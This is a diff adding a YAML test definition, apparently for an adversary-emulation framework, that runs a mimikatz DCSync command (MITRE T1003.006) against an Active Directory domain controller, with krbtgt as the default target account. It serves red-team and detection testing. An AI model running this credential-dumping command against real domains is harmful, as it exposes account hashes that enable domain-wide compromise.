@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: DCSync (Active Directory)
+description: |
+    Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
+    Works against a remote Windows Domain Controller using the replication protocol.
+    Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
+    [Reference](https://adsecurity.org/?p=1729)
+args:
+    - name: domain
+      type: string
+      default: '%userdnsdomain%'
+    - name: user
+      type: string
+      default: krbtgt
+    - name: mimikatz_path
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+uuid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.006: DCSync'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: dcsync-(active-directory)
+      inline: |
+        {{.Args.mimikatz_path}} "lsadump::dcsync /domain:{{.Args.domain}} /user:{{.Args.user}}@{{.Args.domain}}" "exit"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
